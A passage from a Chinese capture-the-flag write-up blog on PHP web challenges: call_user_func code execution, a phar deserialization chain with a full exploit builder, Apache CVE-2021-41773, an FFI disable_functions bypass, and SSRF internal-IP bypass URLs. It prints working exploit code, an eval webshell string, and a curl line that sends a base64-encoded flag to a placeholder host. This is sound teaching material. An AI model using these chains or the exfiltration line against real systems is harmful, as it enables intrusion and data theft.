          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                   <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>               &#125; <span class="hljs-keyword">elseif</span> (!function_exists(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>               &#125;<br><br>               <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                   <span class="hljs-variable">$p</span> = [];	<span class="hljs-comment">//获取用户设置的变量</span><br>                   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                       <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                           <span class="hljs-variable">$n</span> = intval(substr(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                           <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                       &#125;<br>                   &#125;<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br>                       <span class="hljs-variable">$rt</span> = call_user_func_array(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-variable">$rt</span> = call_user_func(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);   <span class="hljs-comment">//rce入口</span><br>                   &#125;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>               &#125;<span class="hljs-keyword">else</span>&#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>               &#125;<br>           <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>               <span class="hljs-keyword">return</span> json_encode(<span class="hljs-keyword">$this</span>-&gt;date);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>
<p>显然此时我们有实现命令执行，首先需要覆盖掉函数参数中自带的<code>action=list</code>，于是我们构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?space=admin&amp;mod=whatever action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">phpinfo</span>	</span><br></code></pre></td></tr></table></figure>
<p>重要的位置我已经加上了注释，在代码执行中，我们成功将<code>system['action']</code>修改为了function，调用phpinfo是因为flag藏在其中（这里也是需要一些运气和经验的），如果我出的话，应该还是会实现rce吧。</p>
<h2 id="反序列化">7、反序列化</h2>
<h3 id="安询杯easy_serialize_php字符串逃逸">1、安询杯—easy_serialize_php（字符串逃逸）</h3>
<h3 id="swpu2021babyunser">2、SWPU2021——babyunser</h3>
<p>这道题前面大概就是文件上传，在查看界面存在文件包含漏洞，可以直接扒下全部源码。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230331231210292.png" srcset="/img/loading.gif" lazyload alt="image-20230331231210292" /></p>
<p>源码一看，发现不让使用常见的伪协议，但是留下了phar协议，而且读取文件内容也非常像是利用phar反序列化。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&#x27;aa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=strtolower(<span class="hljs-keyword">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;content=<span class="hljs-string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不合理&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-keyword">$this</span>-&gt;filename;<br>        <span class="hljs-variable">$lt</span>=<span class="hljs-keyword">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;<br>        <span class="hljs-comment">//此功能废弃，不想写了</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filter();<br>        <span class="hljs-variable">$contents</span>=file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;404 not found&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>]&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;content;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&#x27;eval&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;arg=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call</span><br></code></pre></td></tr></table></figure>
<p>经过分析，利用链大概如下，对部分内容做说明</p>
<ol type="1">
<li>链到zz后，此时可以调用write，var可以设置为content，令filename为ff，这样才能触发__get。此时的var虽然是字符串"content"，但是在PHP中仍然处理为属性content</li>
<li>调用__get后，传入的参数$key就是ff中的私有属性$content</li>
<li>ff -&gt; $content设置为zz，由于zz中不存在system的方法，因此触发了__call，传入的参数$name为调用的函数名称，参数就是外部调用的参数（此时为数组形式）</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call<br><span class="hljs-regexp">//</span>                  method=write                   cmd = ls<br><span class="hljs-regexp">//</span>                  var = content				   <span class="hljs-keyword">func</span> = system<br></code></pre></td></tr></table></figure>
<p>最后是构造phar文件，然后利用phar文件触发反序列化实现rce。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    &#125;<br><br><span class="hljs-comment">// aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call</span><br><span class="hljs-comment">//                  method=write                   cmd = ls</span><br><span class="hljs-comment">//                  var = content</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> xx();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> ff(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$b</span>-&gt;func = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> zz(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> aa(<span class="hljs-variable">$c</span>);<br><br>    <span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$d</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;flag&quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>
<p>最后在read.php下利用phar协议完成攻击</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">file</span>=phar://upload/b<span class="hljs-number">80</span>f<span class="hljs-number">81</span>d<span class="hljs-number">26</span>bc<span class="hljs-number">22</span>a<span class="hljs-number">2148</span>aacf<span class="hljs-number">1</span>e<span class="hljs-number">5</span>ff<span class="hljs-number">1</span>dbce.txt&amp;method=write&amp;var=content&amp;cmd=cat /flag<br></code></pre></td></tr></table></figure>
<h2 id="中间件">8、中间件</h2>
<h3 id="nssez_rcecve-2021-41773">1、NSS—ez_rce（CVE-2021-41773）</h3>
<p>打开网页，啥都没有，抓个包发现headers里也没有信息，只能扫一下目录，看看有没有源码/后台/api泄露。</p>
<p>如果再没有，看看服务器中间件等等有无一些新出的CVE。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" srcset="/img/loading.gif" lazyload alt="image-20220819205451649" /></p>
<p>看到/cgi-bin，想到之前apache出的cve，检查一下apache的版本2.4.49，基本确定是路径穿越的CVE。</p>
<p>于是使用rce的payload：</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" srcset="/img/loading.gif" lazyload alt="image-20220819205728808" /></p>
<p>利用grep找到flag</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" srcset="/img/loading.gif" lazyload alt="image-20220819205821071" /></p>
<h2 id="php扩展">9、PHP扩展</h2>
<h3 id="rctf-nextphpffi">1、RCTF-nextphp（FFI）</h3>
<p>这道题的代码还是非常简单，单刀直入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>查看phpinfo之后发现经典的disable_function</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" srcset="/img/loading.gif" lazyload alt="image-20220923152627815" /></p>
<p>蚁剑连接之后，发现没法上传文件，LD_PRELOAD的利用失败了。</p>
<p>发现同目录下存在preload.php，并且该文件可编辑，也被index.php包含了</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" srcset="/img/loading.gif" lazyload alt="image-20220923161449908" /></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [<br>            <span class="hljs-string">&#x27;ret&#x27;</span> =&gt; <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&#x27;func&#x27;</span> =&gt; <span class="hljs-string">&#x27;FFI::cdef&#x27;</span>,<br>            <span class="hljs-string">&#x27;arg&#x27;</span> =&gt; <span class="hljs-string">&#x27;int system(char *command);&#x27;</span><br>        ];<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> (<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;ret&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;func&#x27;</span>](<span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;arg&#x27;</span>]);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span> </span>&#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>) </span>&#123;<br>            array_merge(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;run();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> (<span class="hljs-params"></span>): <span class="hljs-title">string</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;data);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data = unserialize(<span class="hljs-variable">$payload</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;run();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>看起来我们的攻击点在run函数，如何利用run函数是一个问题</p>
<p>这里就引到了PHP的FFI扩展，简单来说就是在PHP中引入C语言的这样一种机制，那么我们就可以利用C语言标准库里的system来绕过disable_function。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br>    <span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="hljs-comment">//由GET传参的任意代码执行</span><br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>    @unlink(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>上面就是FFI实现RCE攻击的基础代码，当然我们要根据我们的情况进行修改。</p>
<p>这里主要是两个问题</p>
<ol type="1">
<li>如何构造反序列化链</li>
<li>如何获取到被赋值的data['ret']</li>
</ol>
<p>首先，我们注意到存在两个序列化函数，两者是不同的。</p>
<ol type="1">
<li>__serialize()会先于serialize被调用，最后返回的是数组的序列化结果。</li>
<li>serialize()返回的是class A的序列化结果。</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ret&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;FFI::cdef&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;int system(char *command);&quot;</span>;&#125;<br><span class="hljs-comment">//注意两者的区别</span><br>C:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">89</span>:&#123;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ret&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;FFI::cdef&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;int system(char *command);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
<p>其次，对于获取到被赋值的data['ret']，最开始的时候我想的是直接修改源代码，将data属性修改为public，但是失败了var_dump查看之后，发现属性仍然为protected，查询了opache.preload，才发现preload.php已经被编译为opcode，我们修改文本是没有意义的。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" srcset="/img/loading.gif" lazyload alt="image-20220923161825562" /></p>
<p>于是重新构造payload，这回利用__serialize()能够返回data，最后成功构造payload。</p>
<p>最后是无回显的，当然这已经是小问题了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=unserialize(<span class="hljs-string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>)-&gt;__serialize()[<span class="hljs-string">&#x27;ret&#x27;</span>]-&gt;system(<span class="hljs-string">&#x27;curl http://your-ip:port/`cat /flag | base64`&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="xss">10、XSS</h2>
<h2 id="ssrf">11、SSRF</h2>
<h3 id="网鼎ssrfmessrf-攻击redis协议">1、2020网鼎——SSRFMe（SSRF 攻击Redis协议）</h3>
<p>这道题最开始是一个PHP的一个内网过滤</p>
<p>先看一下SSRF的实现，经过分析可以得到以下的结论：</p>
<ol type="1">
<li>仅开放了特定的协议，无法使用file协议或者其他PHP伪协议直接读取文件</li>
<li>增加了对于内网IP的检查</li>
<li>无法使用302跳转（libcurl默认也不支持302跳转）</li>
</ol>
<p>提示可以查看hint.php，那么第一步就是如何绕过内网IP的审查</p>
<p>方法一：使用libcurl和parse_url的解析差异，构造如下url，这个漏洞在7.4之后的PHP已经修复了。本题无法使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//user:passwd@127.0.0.1@baidu.com/hint.php</span><br></code></pre></td></tr></table></figure>
<p>方法二：畸形url绕过，构造如下url</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">///127.0.0.1</span><br></code></pre></td></tr></table></figure>
<p>方法三：使用0.0.0.0绕过，此法仅适用于linux</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//0.0.0.0</span><br></code></pre></td></tr></table></figure>
<p>方法四：DNS重绑定，TODO</p>
